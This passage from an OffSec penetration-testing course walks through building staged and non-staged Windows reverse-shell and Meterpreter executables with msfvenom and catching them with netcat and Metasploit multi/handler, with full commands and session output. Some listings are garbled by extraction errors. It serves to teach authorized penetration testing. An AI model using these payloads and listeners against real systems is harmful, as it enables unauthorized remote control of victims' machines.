
# OffSec

Penetration Testing with Kali Linux

```
kalikali~$ nc -nvlp 443
listening on [any] 443 ...
connect to [192.168.119.2] from [192.168.50.202] 50822
Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.
```

```
C:\Users\admin>
```

> Listing 665 - Incoming reverse shell from non-staged Windows binary

Now, let's use a staged payload to do the same. For this, we'll use msfvenom to create a Windows binary with a staged TCP reverse payload.

```
kalikali~$ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o staged.exe
[-] No platform was selected, choosing MsfModule:Platform:Windows from the payload
[-] No arch selected, selecting x64 for the payload
[-] No encoder specified, outputting raw payload
Payload: 510 bytes
Final size of exe file: 7168 bytes
Saved as: staged.exe
```

> Listing 666 - Creating a executable with a staged TCP reverse shell payload

We'll repeat the steps from Listing 664 to download and execute staged.exe. We'll also start the Netcat listener.

```
kalikali~$ nc -nvlp 443
listening on [any] 443
connect to [192.168.119.2] from [UNKNOWN] [192.168.50.202]
whoami
```

> Listing 667 - Incoming reverse shell from staged Windows binary

While we received an incoming connection, we cannot execute any commands through it. This is because Netcat doesn't handle a staged payload

To get a functional command prompt, we can use Metasploit's multi/handler module, which works for the majority of staged, non-staged, and more advanced payloads. Let's use this module to receive the incoming connection from staged.exe.

In Metasploit, let's use the module with use. Then, we have to set the payload of the incoming connection. In this case, we use windows/x64/shell/reverse_tcp. In addition, we have to set the options for the payload. We enter the IP of our Kali machine as argument for LHOST and port 443 as argument for LPORT. Finally, we can run to launch the module and set up the listener.

```
msf6 exploit(multi/http/apache_normalize_path_re) > use multi/handler[*] configured payload generic/reverse_tcp
```

```
msf6 exploit(multi/handler) > set payload windows/x64/shell/reverse_tcp
payload = windows/x64/shell/reverse_tcp
```

```
msf6 exploit(multi/handler) > show options
...
```

> 589 (Rapid7, 2018), https://www.rapid7.com/db/modules/exploit/multi/handler/

PWK - Copyright ©2023 OffSec Services Limited. All rights reserved.

664

# OffSec

Payload options (windows/shell/reverse_tcp):

| Name | Current Setting | Required | Description |
|---|---|---|---|
| EXITFUNC | process | yes | Exit technique (Accepted: '', seh, thread, process, none) |
| LHOST | (specified) | yes | The listener address (an interface may be) |
| LPORT | 4444 | yes | The listener port |

```
msf6 exploit(multi/handler) > set LHOST 192.168.119.2
LHOST => 192.168.119.2
msf6 exploit(multi/handler) > set LPORT 443
```

```
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.119.2:443
Listing 666 - Set payload and options for multi/handler and launch it
```

Once our listener is running on port 443, we can start staged.exe again on BRUTE. Our Metasploit multi/handler receives the incoming staged payload and provides us with an interactive reverse shell in the context of a session.

```
[*] Started reverse TCP handler on 192.168.119.2:443
[*] Sending stage (336 bytes) to 192.168.50:202
[*] Command shell session 6 opened (192.168.119.2:443 -> 192.168.50.202:50838)
2022-08-01 10:18:13 -0400
```

Shell Banner:
Microsoft Windows [Version 10.0.20348.169]

```
C:\Users\justin> whoami
whoami
brute2justin
Listing 666 - Incoming reverse shell
```

The staged reverse shell and Metasploit started a session for us to use. For staged and other payload types (such as Meterpreter), we must use multi/handler instead of using Netcat in order for the payload to work. Using run without arguments will block the command prompt until we background the session. As've learned, we can use run -j to start the listener in the background, allowing us to continue work while we wait for the connection. We can use jobs to get a list of all currently active listeners, as waiting for connections. Let's exit our session and restart the listener with run -j. Then, we execute staged.exe again, Metasploit notifies us that a new session was created.

```
C:\Users\justin> exit
exit
```

```
[+] 192.168.50.202 - Command shell session 6 closed. Reason: User
msf6 exploit(multi/handler) > run -j
[*] exploit running as background 1.
[*] exploit completed, but no session was created.
```

```
[+] Started TCP handler on 192.168.119.2:443
msf6 exploit(multi/handler) > jobs
```

| | Name | Payload | Payload opts |
|---|---|---|---|
| 1 | Exploit: multi/handler | windows/x64/shell/reverse_tcp | tcp://192.168.119.2:443 |

```
msf6 exploit(multi/handler)
[*] Sending stage (336 bytes) to 192.168.50.202
[*] Command shell session 7 opened (192.168.119.2:443 -> 192.168.50.202:50839) at 2022-08-01 10:26:02 -0400

Created a new session for the incoming connection, we could now gain access with it using the session ID as argument. We can use the generated payloads from msfvenom in various situations during penetration test. We can use them to create executable files such as PowerShell scripts, Windows executables, or Linux executables to transfer to a target and start a reverse shell. Next, we can create malicious files such as shells to exploit application vulnerabilities. Finally, we can also use the generated files from msfvenom as part of a client-side attack. In this section, we explored payloads generated with msfvenom. We got familiar with how we can use msfvenom to generate executable files containing these payloads and how to set up multi/handler as listener for staged and non-staged payloads. Using msfvenom to generate executable files with various payloads and different file types will assist us greatly in penetration tests.

## 20.3 Performing-Exploitation with Metasploit

This Learning Unit covers the following Learning Objectives:

- Use Meterpreter post-exploitation features
- Use post-exploitation modules
- Perform pivoting with Metasploit

Once we gain access to a target machine, we can move on to the post-exploitation phase where we gather information, take steps to maintain our access, pivot to other machines, elevate our privileges, and so on.

---

The Metasploit Framework has interesting post-exploitation features that can simplify aspects of the process. In addition to the built-in commands, MSF modules take an active session as an argument and perform post-exploitation operations on them.

In this Learning Unit, we'll explore these post-exploitation features and modules. We'll perform pivoting with modules of the Metasploit Framework.

### 20.3.1 Meterpreter Post-Exploitation Features

In previous sections, we used the Meterpreter to navigate the system, obtain information about the target system, and transfer files to and from the machine. Apart from the commands we already used, Meterpreter contains numerous post-exploitation features.

Let's explore some of these features. Note that the Meterpreter payload contains fewer post-exploitation features than the Windows one. Therefore, we'll explore these features on the Windows target ITWK01. Let's assume we already gained an initial foothold on the target system and deployed a bind shell by accessing the system.

To begin, we'll create an executable binary with msfvenom a non-staged Meterpreter payload and name it met.exe.

```
kali@kali~$ msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.44 LPORT=443 -f exe -o met.exe
[-] No platform was selected, choosing Msf:Module:Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 201820 bytes
Final size of exe: 283384 bytes
Saved as: met.exe
```

> Listing 671- Create an executable with a Meterpreter reverse shell payload

After we set the payload and options, we'll launch the activated multi/handler module in Metasploit.

```
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_https
payload => windows/x64/meterpreter_reverse_https
msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443

msf6 exploit(multi/handler) > run
[*] exploit running as background 2.
[*] exploit completed, but no session was created.

[*] Started HTTPS reverse handler on https://192.168.119.44:443
```

> Listing 672- Set options and start multi/handler

Next, we'll start a Python script to serve met.exe. Then, we will connect to the bind shell on port 4444 on ITWK01. download met.exe using PowerShell and start the Windows binary.
